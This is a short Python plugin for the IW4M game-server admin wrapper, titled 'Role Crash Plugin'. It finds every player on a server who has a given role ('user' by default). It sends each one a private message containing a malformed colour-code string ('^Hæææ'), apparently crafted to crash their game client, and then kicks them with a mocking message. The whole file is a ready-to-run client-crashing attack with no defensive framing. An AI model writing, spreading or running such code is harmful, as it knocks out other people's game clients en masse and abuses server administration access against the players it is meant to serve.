# ---------------------------- #
# Role Crash Plugin
# Author:  Budiworld
# GitHub:  https://github.com/Yallamaztar/iw4m
# ---------------------------- #

import os, time
from iw4m import IW4MWrapper

class CrashRolePlugin:
    def __init__(self):
        self.iw4m = IW4MWrapper(
            base_url=os.environ['IW4M_URL'],
            server_id=os.environ['IW4M_ID'],
            cookie=os.environ['IW4M_HEADER']
        )

        self.server = self.iw4m.Server(self.iw4m)
        self.commands = self.iw4m.Commands(self.iw4m)

    def kick_player_by_role(self, role: str):
        players = self.server.get_players()
        for player in players:
            if player['role'].lower() == role.lower():
                self.crash_and_kick(player['name'])
    
    def crash_and_kick(self, name: str):
        self.commands.privatemessage(name, '^Hæææ')
        time.sleep(1)
        self.commands.kick(name, 'GG ^H99holo_7')

if __name__ == '__main__':
    role = "user"
    plugin = CrashRolePlugin()
    plugin.kick_player_by_role(role)